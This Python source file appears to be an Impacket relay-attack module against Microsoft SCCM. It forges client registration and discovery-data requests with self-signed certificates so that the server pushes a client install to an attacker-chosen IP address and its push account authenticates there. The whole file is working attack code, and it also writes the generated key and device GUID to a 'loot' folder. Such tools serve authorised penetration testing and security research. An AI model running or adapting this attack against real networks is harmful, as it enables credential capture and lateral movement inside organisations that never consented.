# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SCCM relay attack to invoke client push authentication
# 
# Authors:
#    Jarno van den Brink (@vonzy)
#    Huge thanks to MrFrey for writing the DDR requests in sccmhunter

import os
import zlib
import xml.etree.ElementTree                            as ET

from time                                               import sleep
from datetime                                           import datetime, timedelta
from impacket                                           import LOG
from cryptography                                       import x509
from cryptography.x509.oid                              import NameOID
from cryptography.x509                                  import ObjectIdentifier
from cryptography.hazmat.primitives                     import serialization, hashes, padding
from cryptography.hazmat.primitives.asymmetric          import rsa
from cryptography.hazmat.primitives.asymmetric.padding  import PKCS1v15, OAEP, MGF1

# Request templates
REGISTRATION_REQUEST_TEMPLATE = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}">
<AgentInformation AgentIdentity="CCMSetup.exe" AgentVersion="5.00.8325.0000" AgentType="0" />
<Certificates><Encryption Encoding="HexBinary" KeyType="1">{encryption}</Encryption><Signing Encoding="HexBinary" KeyType="1">{signature}</Signing></Certificates>
<DiscoveryProperties><Property Name="Netbios Name" Value="{client}" />
<Property Name="FQ Name" Value="{clientfqdn}" />
<Property Name="Locale ID" Value="1033" />
<Property Name="InternetFlag" Value="0" />
</DiscoveryProperties></Data>"""
REGISTRATION_REQUEST_WRAPPER_TEMPLATE = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
SCCM_HEADER_TEMPLATE = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
POLICY_REQUEST_HEADER_TEMPLATE = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
POLICY_REQUEST_TEMPLATE = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
REPORT_BODY = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><REPORT_BODY /></Report>"""

DDR_REQUEST_HEADER_TEMPLATE = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Attachment Type="ByteRange" Length="{length1}" Name="403838f7-69bb-43d5-8362-28a5755b97b5" Offset="0" /><Attachment Length="{length2}" Offset="{offset}" /><Body Type="ByteRange" Length="{bodylength}" Offset="{bodyoffset}" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{CA6A20DC-2440-44B1-A78F-E2FE792973BA}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>ASync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_DdrEndpoint</TargetAddress><TargetEndpoint>MP_DdrEndpoint</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
DDR_BODY_1 ="""<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>437</CodePage><SystemDefaultLCID>1033</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date1}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date2}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><ReportBody /></Report>"""
DDR_BODY_2 = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>437</CodePage><SystemDefaultLCID>1033</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date1}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date2}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><ReportBody><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="CCM_ComputerSystem" ParentClass="CCM_ComputerSystem"><CCM_ComputerSystem><Domain>{domain}</Domain></CCM_ComputerSystem></Instance><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="CCM_Client" ParentClass="CCM_Client"><CCM_Client><ClientIdChangeDate>{date3}</ClientIdChangeDate><ClientVersion>5.00.8325.0000</ClientVersion><PreviousClientId>Unknown</PreviousClientId></CCM_Client></Instance><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="SMS_Authority" ParentClass="SMS_Authority"><SMS_Authority /></Instance><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="CCM_ADSiteInfo" ParentClass="CCM_ADSiteInfo"><CCM_ADSiteInfo><ADSiteName>Default-First-Site-Name</ADSiteName></CCM_ADSiteInfo></Instance><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="CCM_ExtNetworkAdapterConfiguration" ParentClass="CCM_ExtNetworkAdapterConfiguration"><CCM_ExtNetworkAdapterConfiguration><FQDN>{clientfqdn}</FQDN></CCM_ExtNetworkAdapterConfiguration></Instance><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="Win32_ComputerSystemProduct" ParentClass="Win32_ComputerSystemProduct"><Win32_ComputerSystemProduct><IdentifyingNumber>VMware-56 4d 98 6b b1 fc ca 51-3c 19 b5 6e 8a 12 0b e2</IdentifyingNumber><Name>VMware Virtual Platform</Name><UUID>{clientid}</UUID><Version>None</Version></Win32_ComputerSystemProduct></Instance><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="CCM_DiscoveryData" ParentClass="CCM_DiscoveryData"><CCM_DiscoveryData><PlatformID>Microsoft Windows NT Workstation 2010.0</PlatformID></CCM_DiscoveryData></Instance><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="CCM_NetworkAdapterConfiguration" ParentClass="CCM_NetworkAdapterConfiguration"><CCM_NetworkAdapterConfiguration><IPSubnet>10.6.10.0</IPSubnet><IPSubnet>254.128.0.0</IPSubnet></CCM_NetworkAdapterConfiguration></Instance><Instance Content="New" Namespace="\\\\{client}\\root\\ccm" Class="Win32_NetworkAdapterConfiguration" ParentClass="Win32_NetworkAdapterConfiguration"><Win32_NetworkAdapterConfiguration><IPAddress>10.6.10.43</IPAddress><IPAddress>fe80::d89c:e797:5954:7db1</IPAddress><Index>1</Index><MACAddress>BC:25:11:8B:02:CF</MACAddress></Win32_NetworkAdapterConfiguration></Instance></ReportBody></Report>"""

### Cryptography utility functions ###
def create_certificate(privatekey):
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "ConfigMgr Client"),
    ])
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        privatekey.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.utcnow() - timedelta(days=2)
    ).not_valid_after(
        datetime.utcnow() + timedelta(days=365)
    ).add_extension(
        x509.KeyUsage(digital_signature=True, key_encipherment=False, key_cert_sign=False,
                                key_agreement=False, content_commitment=False, data_encipherment=True,
                                crl_sign=False, encipher_only=False, decipher_only=False),
        critical=False,
    ).add_extension(
        x509.ExtendedKeyUsage([ObjectIdentifier("1.3.6.1.4.1.311.101.2"), ObjectIdentifier("1.3.6.1.4.1.311.101")]),
        critical=False,
    ).sign(privatekey, hashes.SHA256())

    return cert

def create_private_key():
    privatekey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return privatekey

def SCCM_sign(private_key, data):
        signature = private_key.sign(data, PKCS1v15(), hashes.SHA256())
        signature_rev = bytearray(signature)
        signature_rev.reverse()
        return bytes(signature_rev)


def build_MS_public_key_blob(private_key):
    blobHeader = b"\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00"
    blob = blobHeader + private_key.public_key().public_numbers().n.to_bytes(int(private_key.key_size / 8), byteorder="little")
    return blob.hex().upper()


### Various utility functions ###
def encode_UTF16_strip_BOM(data):
    return data.encode('utf-16')[2:]

def clean_junk_in_XML(xml_string):
    root_end = xml_string.rfind('</')
    if root_end != -1:
        root_end = xml_string.find('>', root_end) + 1
        clean_xml_string = xml_string[:root_end]
        return clean_xml_string
    return xml_string

### Client registration utility functions ###
def generate_registration_request_payload(management_point, public_key, private_key, client_name):
    registrationRequest = REGISTRATION_REQUEST_TEMPLATE.format(
        date=datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
        encryption=public_key,
        signature=public_key,
        client=client_name,
        clientfqdn=client_name
    )

    signature = SCCM_sign(private_key, encode_UTF16_strip_BOM(registrationRequest)).hex().upper()
    registrationRequestWrapper = REGISTRATION_REQUEST_WRAPPER_TEMPLATE.format(
     data=registrationRequest,
     signature=signature
    )
    registrationRequestWrapper = encode_UTF16_strip_BOM(registrationRequestWrapper) + "\r\n".encode('ascii')

    registrationRequestHeader = SCCM_HEADER_TEMPLATE.format(
        bodylength=len(registrationRequestWrapper)-2,
        client=client_name,
        date=datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
        sccmserver=management_point
    )

    final_body = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
    final_body += registrationRequestHeader.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
    final_body += zlib.compress(registrationRequestWrapper) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

    return final_body

def generate_ddr_request_payload(management_point, public_key, private_key, client_name, guid, domain_name, ip):
    ddrRequest1 = encode_UTF16_strip_BOM(DDR_BODY_1.format(
        clientid=guid,
        clientfqdn=client_name,
        client=client_name,
        date1=datetime.now().strftime("%Y%m%d%H%M%S.575000+120"),
        date2=datetime.now().strftime("%Y%m%d%H%M%S.590000+000"),
        domain=domain_name,
        )) + b"\x00\x00\r\n"
    ddrRequest2 = encode_UTF16_strip_BOM(DDR_BODY_2.format(
        clientid=guid,
        clientfqdn=ip,
        client=client_name,
        date1=datetime.now().strftime("%Y%m%d%H%M%S.575000+120"),
        date2=datetime.now().strftime("%Y%m%d%H%M%S.590000+000"),
        date3= datetime.now().strftime("%m/%d/%Y %H:%M:%S"),
        domain=domain_name
        )) + b"\x00\x00\r\n"

    DDRRequestCompressed = zlib.compress(ddrRequest1+ddrRequest2)
    clientID = f"GUID:{guid.upper()}"
    clientIDsignature = SCCM_sign(private_key, encode_UTF16_strip_BOM(clientID) + "\x00\x00".encode('ascii')).hex().upper()
    DDRRequestSignature = SCCM_sign(private_key, DDRRequestCompressed).hex().upper()

    ddrRequestHeader = DDR_REQUEST_HEADER_TEMPLATE.format(
        bodylength=len(ddrRequest2)-2,
        bodyoffset=len(ddrRequest1),
        length1=len(ddrRequest1)-4,
        length2=len(ddrRequest2)-4,
        offset=len(ddrRequest1),
        sccmserver=management_point,
        client=client_name,
        publickey=public_key,
        clientIDsignature=clientIDsignature,
        payloadsignature=DDRRequestSignature,
        clientid=guid,
        date=datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
    )

    final_body = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
    final_body += ddrRequestHeader.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
    final_body += DDRRequestCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

    return final_body

class SCCMClientPushAttack:
    
    def _run(self):

        management_point = f"{'https' if self.client.port == 443 else 'http'}://{self.client.host}"

        LOG.info("Starting SCCM Client Push attack")
        loot_dir = f"{self.client.host}_{datetime.now().strftime('%Y%m%d%H%M%S')}"

        try:
            os.makedirs(loot_dir, exist_ok=True)
            LOG.info(f"Temporary directory is: {loot_dir}")
        except Exception as err:
            LOG.error(f"Error creating base output directory: {err}")
            return

        os.makedirs(f"{loot_dir}/device")
        LOG.info(f"Reusable Base64-encoded certificate:\n")
        private_key = create_private_key()
        certificate = create_certificate(private_key)
        public_key = certificate.public_bytes(serialization.Encoding.DER).hex().upper()
        LOG.info(public_key + "\n")

        # Writing certs to device info directory for potential future use
        with open(f"{loot_dir}/device/cert.pem", 'wb') as f:
            f.write(certificate.public_bytes(serialization.Encoding.PEM))
        with open(f"{loot_dir}/device/key.pem", 'wb') as f:
            f.write(private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption()))

        # Device registration
        LOG.info(f"Registering SCCM client with client name '{self.config.SCCMClientPushDeviceName}'")
        registration_request_payload = generate_registration_request_payload(management_point, public_key, private_key, self.config.SCCMClientPushDeviceName)
        
        try:
            register_response = self.register_client(management_point, registration_request_payload)
            if register_response == None:
                LOG.error(f"Device registration failed")
                return
            root = ET.fromstring(register_response[:-1])
            client_guid = root.attrib["SMSID"].split("GUID:")[1]
        except Exception as e:
            LOG.error(f"Device registration failed: {e}")
            return
    
        with open(f"{loot_dir}/device/guid.txt", 'w') as f:
            f.write(f"{client_guid}\n")
        with open(f"{loot_dir}/device/client_name.txt", 'w') as f:
            f.write(f"{self.config.SCCMClientPushDeviceName}\n")

        LOG.info(f"Succesfully registered device with GUID: {client_guid}")
        LOG.info(f"Waiting {self.config.SCCMClientPushSleep} seconds before sending DDR request.")
        sleep(int(self.config.SCCMClientPushSleep))

        # DDR request
        LOG.info(f"Sending DDR request to invoke client push.")
        LOG.info(f"Ensure to be on the same time zone as the SCCM server.")
        ddr_request_payload = generate_ddr_request_payload(management_point, public_key, private_key, self.config.SCCMClientPushDeviceName, client_guid, self.config.SCCMClientPushSite, self.config.SCCMClientPushIP)

        try:
            ddr_response = self.send_ddr(management_point, ddr_request_payload)
        except Exception as e:
            LOG.error(f"DDR request failed: {e}")
            return
        LOG.info("DONE - attack finished. Successfully sent DDR request")
        LOG.info(f"Invoking Client Push Installation to '{self.config.SCCMClientPushIP}'")



    def register_client(self, management_point, registration_request_payload):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender",
            "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
        }
        
        self.client.request("CCM_POST", f"{management_point}/ccm_system_windowsauth/request", registration_request_payload, headers=headers)
        body = self.client.getresponse().read()


        boundary = "aAbBcCdDv1234567890VxXyYzZ"
        multipart_data = body.split(('--' + boundary).encode())
        for part in multipart_data:
            if not part or part == b'--\r\n':
                continue
            try:
                headers_part, content = part.split(b'\r\n\r\n', 1)
            except:
                pass

            if b'application/octet-stream' in headers_part:
                decompressed_content = zlib.decompress(content).decode('utf-16')
                return decompressed_content
        return None

    def send_ddr(self, management_point, ddr_request_payload):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender",
            "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
        }

        self.client.request("CCM_POST", f"{management_point}/ccm_system/request", ddr_request_payload, headers=headers)
        body = self.client.getresponse().read()

        boundary = "aAbBcCdDv1234567890VxXyYzZ"
        multipart_data = body.split(('--' + boundary).encode())
        for part in multipart_data:
            if not part or part == b'--\r\n':
                continue
            try:
                headers_part, content = part.split(b'\r\n\r\n', 1)
            except:
                pass

            if b'application/octet-stream' in headers_part:
                decompressed_content = zlib.decompress(content).decode('utf-16')
                return decompressed_content

        return None